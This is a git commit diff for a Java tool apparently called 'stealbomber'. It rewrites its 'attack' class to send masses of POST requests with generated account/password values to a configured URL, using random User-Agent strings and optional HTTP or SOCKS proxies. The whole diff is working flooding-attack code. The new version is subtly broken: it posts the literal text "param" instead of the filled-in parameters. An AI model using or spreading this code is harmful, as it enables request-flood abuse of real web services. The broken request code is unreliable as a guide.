e4286e6f56c20248f66ccbdccf85266979f09db3
ObcbO <m17089494917@163.com>
2022-07-03 10:22:00 +0800

    HttpClient第一版

--- src/stealbomber/attack/Center.java
+++ src/stealbomber/attack/Center.java
@@ -6,7 +6,11 @@ import java.net.HttpURLConnection;
 import java.net.InetSocketAddress;
 import java.net.MalformedURLException;
 import java.net.Proxy;
+import java.net.URI;
 import java.net.URL;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse.BodyHandlers;
 import java.util.concurrent.ThreadLocalRandom;
 
 import stealbomber.manage.GetFile;
@@ -29,17 +33,11 @@ public class Center implements Runnable {
     private static String phost;// 代理host
     private static int pport;// 代理端口
 
-    private static URL url;
+    static HttpClient client = HttpClient.newHttpClient();
+    static HttpRequest request = null;
 
     static {// 初始化
         UAL = Storage.UA.length;
-
-        // 设置攻击网址
-        try {
-            url = new URL(GetFile.url);
-        } catch (MalformedURLException e) {
-            e.printStackTrace();
-        }
 
         // proxy
         if (GetFile.proxyswitch) {
@@ -64,49 +62,16 @@ public class Center implements Runnable {
     }
 
     private static void go(String name, String pass) {
-        HttpURLConnection urlConn = null;
+        String param = GetFile.param.replace("$[account]", name);
+        param = param.replace("$[password]", pass);
+        request = HttpRequest.newBuilder()
+                .POST(HttpRequest.BodyPublishers.ofString("param"))
+                .uri(URI.create(GetFile.url))
+                .build();
         try {
-            if (GetFile.proxyswitch) {
-                if ("http".equals(ptype)) {
-                    Proxy lp = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(phost, pport));
-                    urlConn = (HttpURLConnection) url.openConnection(lp);
-                } else if ("socks".equals(ptype)) {
-                    Proxy lp = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(phost, pport));
-                    urlConn = (HttpURLConnection) url.openConnection(lp);
-                }
-            } else {
-                urlConn = (HttpURLConnection) url.openConnection();
-            }
-            urlConn.setRequestMethod("POST");
-            // 超时时间
-            urlConn.setConnectTimeout(3000);
-            // 设置是否输出
-            urlConn.setDoOutput(true);
-            // 设置是否读入
-            urlConn.setDoInput(true);
-            // 设置是否使用缓存
-            urlConn.setUseCaches(false);
-            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
-            urlConn.setInstanceFollowRedirects(false);
-            // 设置请求头
-            urlConn.setRequestProperty("Content-Length", "40");
-            urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            urlConn.setRequestProperty("User-Agent", Storage.UA[ThreadLocalRandom.current().nextInt(UAL)]);
-            // 连接
-            urlConn.connect();
-            // 写入参数到请求中
-            String param = GetFile.param.replace("$[account]", name);
-            param = param.replace("$[password]", pass);
-
-            try (OutputStream out = urlConn.getOutputStream()) {
-                out.write(param.getBytes());
-                // 输出
-                if (GetFile.gps) {
-                    System.out.println(name + " " + pass);
-                }
-                out.flush();
-            }
-        } catch (IOException e) {
+            client.send(request, BodyHandlers.ofString());
+            System.out.println(name + " " + pass);
+        } catch (IOException | InterruptedException e) {
             if (GetFile.gpr) {
                 System.out.println("转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
             }
@@ -125,18 +90,8 @@ public class Center implements Runnable {
                     }
                     ThreadControl.start();
                 }, "ReloadThread").start();
-            } else if (!"Connect timed out".equals(e.getLocalizedMessage())) {
+            } else {
                 error = error + 5;
-            } else if ("Connect timed out".equals(e.getLocalizedMessage())) {
-                error++;
-            }
-        } finally {
-            if (null != urlConn) {
-                try {
-                    urlConn.disconnect();
-                } catch (Exception e) {
-                    System.out.println("httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
-                }
             }
         }
     }
